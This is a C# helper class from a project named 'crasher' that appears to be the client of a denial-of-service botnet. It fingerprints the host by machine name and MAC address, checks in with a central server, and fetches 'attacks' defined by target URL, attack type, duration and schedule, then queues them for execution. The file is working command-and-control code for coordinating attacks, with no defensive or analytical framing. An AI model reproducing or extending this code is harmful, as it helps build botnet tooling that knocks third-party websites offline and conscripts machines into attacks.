using crasher.Model;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;

namespace crasher.Helpers
{
    public static class ClientHelper
    {
        private static WebClient client = new WebClient();
        public static string GetMachineName()
        {
            return Environment.MachineName;
        }

        public static string GetMacAddress()
        {
            var mac = (
                from nic in NetworkInterface.GetAllNetworkInterfaces()
                where nic.OperationalStatus == OperationalStatus.Up
                select nic.GetPhysicalAddress().ToString()
            ).FirstOrDefault();

            //FORMAT MAC ADDRESS

            for(int i = 2; i < mac.Length; i += 3)
            {
                mac = mac.Insert(i,"-");
            }
            return mac;
        }

        public static bool IsConnectedToMre()
        {
            try
            {
                string response = client.DownloadString(ServerInfo.Server_Function_Path + "/isUserConnected.php");

                if (response.ToLower() == "true")
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
            catch
            {
                return false;
            }
        }


        public static Attack[] GetUserAttacks()
        {
            List<Attack> attackList = new List<Attack>();
            List<IDictionary<string, object>> userAttacks = MREHelper.FormatUserAttacks();

            for (int i = 0; i < userAttacks.Count; i++)
            {
                IDictionary<string, object> attack = userAttacks.ElementAt(i);

                int id = Convert.ToInt32(attack["id"]);
                string url = Convert.ToString(attack["url"]);
                string attackType = Convert.ToString(attack["attackType"]);
                int time = Convert.ToInt32(attack["time"]);
                bool planningEnabled = Convert.ToBoolean(attack["planningEnabled"]);

                if (planningEnabled)
                {
                    string planningDate = Convert.ToString(attack["planningDate"]);
                    string planningTime = Convert.ToString(attack["planningTime"]);
                }

                //IF attack-List contains id x continue else addAttack to List;

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("[Success] Found attack Id: {0}, Url: {1}, AttackType: {2}, Time: {3}", id, url, attackType, time);
                Console.ForegroundColor = ConsoleColor.White;

                //Add attack to list
                Attack final = new Attack(url, AttackHelper.StringToAttackType(attackType), time);
                attackList.Add(final);
            }

            return attackList.ToArray<Attack>();
        }
    }
}
